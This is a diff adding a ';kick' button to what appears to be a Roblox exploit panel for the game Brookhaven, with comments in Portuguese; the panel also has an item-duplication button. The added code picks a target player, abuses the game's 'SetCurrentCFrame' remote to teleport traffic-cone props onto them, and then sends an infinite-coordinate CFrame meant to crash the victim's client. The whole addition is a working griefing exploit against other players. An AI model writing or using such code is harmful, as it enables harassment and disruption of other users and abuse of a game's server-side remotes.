@@ -549,3 +549,80 @@ MainTab:Button({
         WindUI:Notify({ Title = "Script de Dupe", Content = "Processo finalizado com sucesso.", Duration = 5 })
     end
 })
+
+MainTab:Button({
+    Title = ";kick",
+    Callback = function()
+        -- Cláusula de guarda: impede execução se não houver alvo definido
+        if AlvoSelecionado == "" then
+            WindUI:Notify({Title = "⚠️ Requisito", Content = "Nenhum alvo definido na fila de execução administrativa.", Duration = 4})
+            return
+        end
+
+        local Players = game:GetService("Players")
+        local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
+        
+        -- Varredura e localização rigorosa do alvo no servidor
+        local targetPlayer = nil
+        for _, player in pairs(Players:GetPlayers()) do
+            if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
+                targetPlayer = player
+                break
+            end
+        end
+        
+        if not targetPlayer then
+            WindUI:Notify({Title = "❌ Erro Admin", Content = "O alvo especificado não foi localizado no servidor.", Duration = 3})
+            return
+        end
+
+        -- Altere para o nome da pasta de props/cadeiras que seu painel manipula no Brookhaven
+        local itemDeInteracao = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones") 
+        if not itemDeInteracao then
+            WindUI:Notify({Title = "❌ Erro Admin", Content = "Estrutura de interação não mapeada no WorkspaceCom.", Duration = 3})
+            return
+        end
+
+        WindUI:Notify({
+            Title = "🛡️ Painel Admin", 
+            Content = "Executando expulsão por colapso de matriz em " .. targetPlayer.Name .. ".", 
+            Duration = 3
+        })
+
+        local character = targetPlayer.Character
+        local targetHRP = character and character:FindFirstChild("HumanoidRootPart")
+        local itens = itemDeInteracao:GetChildren()
+        
+        if targetHRP and #itens > 0 then
+            for _, item in pairs(itens) do
+                local setCFrameRemote = item:FindFirstChild("SetCurrentCFrame")
+                if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
+                    
+                    -- Disparo assíncrono em thread isolada para máxima eficiência
+                    task.spawn(function()
+                        pcall(function()
+                            -- 1. Puxa a estrutura física da cadeira para o núcleo do alvo (forçando o "Sit")
+                            setCFrameRemote:InvokeServer(targetHRP.CFrame)
+                            
+                            -- 2. Delay milimétrico estratégico para o jogo computar que ele sentou
+                            task.wait(0.08)
+                            
+                            -- 3. Construção da Matriz de CFrame Infinito (Destruição por estresse do buffer)
+                            local infinito = math.huge
+                            local cframeInfinito = CFrame.new(
+                                infinito, infinito, infinito, -- Posição X, Y, Z corrompida no limite
+                                1, 0, 0,                      -- R00, R01, R02
+                                0, 1, 0,                      -- R10, R11, R12
+                                0, 0, 1                       -- R20, R21, R22
+                            )
+                            
+                            -- 4. Envia o comando destrutivo. O cliente dele cai por estouro de renderização/física
+                            setCFrameRemote:InvokeServer(cframeInfinito)
+                        end)
+                    end)
+
+                end
+            end
+        end
+    end
+})
